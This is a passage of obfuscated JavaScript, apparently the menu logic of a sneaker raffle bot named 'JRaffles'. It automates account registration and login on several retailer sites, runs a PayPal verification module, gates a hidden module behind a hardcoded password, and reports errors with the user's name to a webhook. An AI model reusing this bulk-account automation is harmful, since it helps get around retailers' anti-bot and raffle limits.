                                    var _0x4f12ee = _0x4e2615[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x514656('https://bouncewear.com/nl/account/register', _0x4f12ee);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x4e2615[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x326279(_0x4e2615[taskModule]['modules']);
                                        var _0x4f12ee = _0x4e2615[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x4b7ece = await _0x35374c(), _0x37b0ff = await _0xa4b4b2();
                                            return await _0x27cc73('https://patta.nl/account/register', _0x4f12ee, _0x37b0ff, _0x4b7ece), _0x219c3d();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x4b7ece = await _0x35374c(), _0x37b0ff = await _0xa4b4b2();
                                                return await _0x137982('', _0x4f12ee, _0x37b0ff, _0x4b7ece), _0x219c3d();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x4e2615[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x326279(_0x4e2615[taskModule]['modules']);
                                            var _0x4f12ee = _0x4e2615[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x4b7ece = await _0x35374c(), _0x55db3a = await _0xa4b4b2();
                                                return await _0x19ca0a('https://slamjam.nl/account/register', _0x4f12ee, _0x55db3a, _0x4b7ece), _0x219c3d();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x4b7ece = await _0x35374c(), _0x55db3a = await _0xa4b4b2();
                                                    return await _0x3b43de('', _0x4f12ee, _0x55db3a, _0x4b7ece), _0x219c3d();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x4e2615[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x326279(_0x4e2615[taskModule]['modules']);
                                                var _0x4f12ee = _0x4e2615[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x4b7ece = await _0x35374c(), _0x45eb93 = await _0xa4b4b2();
                                                    return await _0x20dc30('https://www.kickz.com/nl/login/', _0x4f12ee, _0x45eb93, _0x4b7ece), _0x219c3d();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x4b7ece = await _0x35374c(), _0x45eb93 = await _0xa4b4b2();
                                                        return await _0x10b686(_0x4f12ee, _0x45eb93, _0x4b7ece), _0x219c3d();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x4e2615[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x326279(_0x4e2615[taskModule]['modules']);
                                                    var _0x4f12ee = _0x4e2615[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x4b7ece = await _0x35374c(), _0x353d49 = await _0xa4b4b2();
                                                        return await _0x5c43eb(_0x4f12ee, _0x353d49, _0x4b7ece), _0x219c3d();
                                                    }
                                                } else {
                                                    if (_0x4e2615[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x45ce86(0x3e8), _0x219c3d();
                                                    else {
                                                        if (_0x4e2615[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x494956 = _0x4e2615[taskModule]['name'];
                                                            const _0x54d902 = await _0x504840();
                                                            var _0x364608 = _0x54d902['split'](';');
                                                            await _0x5dbc4c(_0x364608, _0x494956);
                                                        } else {
                                                            if (_0x4e2615[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x490d3d = 0x0;
                                                                for (const _0x1969f3 in _0x32bec3) {
                                                                    console['log']('(' + _0x490d3d + ')\x20' + _0x1969f3 + '\x20:\x20' + _0x32bec3[_0x1969f3]), _0x490d3d++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x490d3d + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0x3e3371 = await _0x519bf7();
                                                                if (_0x3e3371 == _0x490d3d)
                                                                    return _0x219c3d();
                                                                console['clear'];
                                                                var _0x4c09b2 = 0x0;
                                                                for (var _0x5e9e05 in _0x32bec3) {
                                                                    if (_0x3e3371 == _0x4c09b2) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x5e9e05 + '\x20:'), _0x32bec3[_0x5e9e05] = await _0x18dbd1(), _0x5e836d['writeFileSync']('../settings.json', JSON['stringify'](_0x32bec3));
                                                                        break;
                                                                    } else
                                                                        _0x4c09b2++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0x45ce86(0xbb8), _0x219c3d();
                                                            } else {
                                                                if (_0x4e2615[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0x1d2b3a(), _0x219c3d();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0x4e2615[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x59ac93 = await _0xde2606();
                                                                        _0x59ac93 == 'ModuleVoorDeBoys' ? (await _0x265970(), await _0x341727(), await afewFunction(_0x516ec2[_0x528508], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x45ce86(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x219c3d();
        } catch (_0x40ea70) {
            return console['log'](_0x40ea70), await _0x45ce86(0x3a98);
        }
}
;
_0x42c473('JRaffles\x20' + _0x37a22d), _0x1d2b3a();
try {
    _0x2e7e17();
} catch (_0x472b96) {
    var _0x923b85 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x5ce999
            },
            {
                'name': 'Version',
                'value': '' + _0x37a22d
            },
            {
                'name': 'Error',
                'value': '' + _0x472b96
            }
        ]
    }];
    const _0x452df7 = { 'embeds': _0x923b85 };
    _0x32e91d(_0x49aba5, _0x452df7);
}